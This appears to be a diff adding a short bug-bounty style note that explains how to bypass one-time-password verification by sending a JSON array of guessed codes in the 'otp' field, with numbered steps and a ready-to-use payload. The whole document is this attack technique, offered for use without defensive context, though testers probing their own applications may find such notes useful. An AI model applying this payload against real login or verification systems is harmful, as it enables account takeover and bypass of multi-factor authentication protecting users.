@@ -1,0 +1,18 @@
+Array to bypass OTP verification:
+
+1)Request OTP.
+2)content type is application/JSON
+3)create an array and let the valid OTP was 1337
+
+{
+"otp":[
+"1234",
+"1111",
+"1337",
+"2222",
+"3333",
+"4444",
+"5555"]
+}
+
+4)OTP bypassed
